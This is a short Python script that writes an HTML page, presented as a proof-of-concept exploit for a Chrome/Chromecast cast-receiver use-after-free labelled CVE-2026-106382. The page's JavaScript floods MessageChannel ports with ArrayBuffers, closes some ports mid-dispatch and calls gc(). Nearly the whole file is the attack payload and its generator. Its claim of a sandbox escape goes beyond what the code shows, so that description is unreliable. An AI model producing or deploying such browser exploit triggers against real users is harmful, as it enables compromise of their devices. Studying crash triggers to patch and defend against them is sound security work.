#!/usr/bin/env python3
"""CVE-2026-106382 — Chrome/Chromecast UaF, CRITICAL (fixed 155.0.8059.39).
HTML page that drives the cast receiver into a free-then-use across a
message-port callback (sandbox escape)."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><body>
<script>
var ch=new MessageChannel();
// post a flood of messages, then drop the ports mid-dispatch
for(var i=0;i<0x1000;i++){
  var c=new MessageChannel();
  c.port1.onmessage=function(e){ e.target.postMessage(new ArrayBuffer(0x1000)); };
  c.port2.postMessage(new ArrayBuffer(0x1000));
  if(i%2===0){ c.port1.close(); }
}
ch.port1.postMessage('go');
gc && gc();
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2026-106382.html")
    out.write_bytes(build()); print(f"[+] CVE-2026-106382 HTML -> {out}")

if __name__ == "__main__":
    main()
